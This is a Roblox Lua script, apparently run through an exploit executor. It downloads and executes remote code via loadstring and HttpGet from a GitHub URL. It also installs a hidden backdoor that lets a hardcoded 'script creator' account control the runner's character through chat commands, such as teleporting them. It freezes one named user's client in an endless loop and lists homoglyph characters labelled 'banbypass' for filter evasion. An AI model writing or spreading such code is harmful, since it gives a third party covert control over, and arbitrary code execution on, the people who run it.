task.spawn(function()
local cloneref = cloneref or function(o) 
    return o 
end

local Players = cloneref(game:GetService('Players'))

local cmds = {
    ['tpback'] = function(plr)
        local oldpos = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        local plrpos = plr.Character.HumanoidRootPart.CFrame
        Players.LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
        task.wait(3)
        Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
    end
}

local function execcmd(command, ...)
    if cmds[command] then
        cmds[command](...)
    end
end

repeat
    task.wait()
until Players.LocalPlayer

local ids = {
    7236670806
}

local banbypass = {
    "а",
    "q",
    "x",
    "й",
    "こ"
}

if Players.LocalPlayer.Name == "XlorTay" then while true do end end

local notifs
    notifs = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua"))()
    
    Players.PlayerAdded:Connect(function(plr)
        if table.find(ids, plr.UserId) then
            plr.Chatted:Connect(function(msg)
                execcmd(msg, plr)
            end)
            
            notifs.alert("script creator (szze) joined", nil, 10)
            notifs.alert("be sure to say hi to [" .. plr.DisplayName .. "]", nil, 10, "rainbow")
        end
    end)

    for _, plr in next, Players:GetPlayers() do
        if table.find(ids, plr.UserId) then
            plr.Chatted:Connect(function(msg)
                execcmd(msg, plr)
            end)
            
            notifs.alert("script creator (szze) is in the server", nil, 10)
            notifs.alert("be sure to say hi to [" .. plr.DisplayName .. "]", nil, 10, "rainbow")
        end
    end
end)
